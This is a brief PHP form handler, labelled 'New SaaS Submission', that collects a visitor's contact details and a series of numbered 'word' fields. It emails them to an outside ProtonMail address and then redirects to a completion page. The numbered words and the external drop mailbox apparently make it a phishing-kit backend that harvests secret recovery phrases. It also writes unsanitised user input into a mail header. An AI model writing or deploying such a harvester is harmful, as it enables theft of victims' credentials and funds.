<?php

$company = $_POST["company"] ?? "Unknown Company";
$name = $_POST["name"] ?? "";
$email = $_POST["email"] ?? "";
$phone = $_POST["phone"] ?? "";

$words = [];

foreach($_POST as $k => $v){
    if(strpos($k, "word_") === 0){
        $words[] = $v;
    }
}

$message = "New SaaS Submission\n";
$message .= "====================\n\n";
$message .= "Company: $company\n";
$message .= "Name: $name\n";
$message .= "Email: $email\n";
$message .= "Phone: $phone\n\n";
$message .= "Words:\n";

foreach($words as $i => $w){
    $num = $i + 1;
    $message .= "Word $num: $w\n";
}

$headers  = "From: noreply@cogito.ir\r\n";
$headers .= "Reply-To: $email\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

mail(
    "kadnap@proton.me",
    "New submission - $company",
    $message,
    $headers
);

header("Location: complete.html");
exit();
?>